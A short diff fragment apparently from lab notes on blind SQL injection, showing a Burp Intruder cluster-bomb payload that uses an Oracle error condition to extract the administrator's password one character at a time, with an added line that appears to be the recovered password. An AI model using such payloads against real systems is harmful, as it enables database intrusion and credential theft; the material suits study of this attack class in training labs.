@@ -49,7 +49,7 @@ Finding all the characters of the password
 Use cluster bomb attack
 '||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'
 
-
+8rrorw07x958ovqx8chg
 
 
 
